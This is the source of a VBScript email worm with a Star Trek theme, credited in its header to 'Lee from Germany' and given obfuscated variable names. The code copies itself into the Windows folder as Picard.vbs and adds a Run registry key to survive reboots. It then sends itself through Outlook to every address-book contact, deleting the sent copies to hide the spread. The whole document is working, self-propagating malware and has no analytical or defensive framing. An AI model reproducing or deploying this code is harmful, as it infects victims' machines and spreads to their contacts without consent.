'Worm Created by Lee from Germany
On Error Resume Next
Set qdpvctbuwjd = CreateObject("WScript.Shell")
set hfzjeahmddx=createobject("scripting.filesystemobject")
hfzjeahmddx.copyfile wscript.scriptfullname,hfzjeahmddx.GetSpecialFolder(0)& "\Picard.vbs"
qdpvctbuwjd.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\StartTrek","wscript.exe "&hfzjeahmddx.GetSpecialFolder(0)& "\Picard.vbs %"
if qdpvctbuwjd.regread ("HKCU\software\Picard\mailed") <> "1" then
czihsdpsqwy()
end if
Function czihsdpsqwy()
On Error Resume Next
Set fqrvaymueox = CreateObject("Outlook.Application")
If fqrvaymueox= "Outlook"Then
Set upfkkjleaet=fqrvaymueox.GetNameSpace("MAPI")
For Each azhjlgtbxpg In upfkkjleaet.AddressLists
If azhjlgtbxpg.AddressEntries.Count <> 0 Then
For hrgipuryrly= 1 To azhjlgtbxpg.AddressEntries.Count
Set jjxowprerxu = azhjlgtbxpg.AddressEntries(hrgipuryrly)
Set dcnykgektal = fqrvaymueox.CreateItem(0)
dcnykgektal.To = jjxowprerxu.Address
dcnykgektal.Subject = "Ncc1701e"
dcnykgektal.Body = "Hi, this is Ncc1701e speaking to all Borg's in the Galaxy..!" & vbcrlf & "" & vbcrlf & "You must die..Assimilation to all Terranien Guys..." & vbcrlf & ""
dcnykgektal.Attachments.Add hfzjeahmddx.GetSpecialFolder(0)& "\Picard.vbs"
dcnykgektal.DeleteAfterSubmit = True
If dcnykgektal.To <> "" Then
dcnykgektal.Send
End If
Next
End If
Next
qdpvctbuwjd.regwrite "HKCU\software\Picard\mailed", "1"
end if
End Function
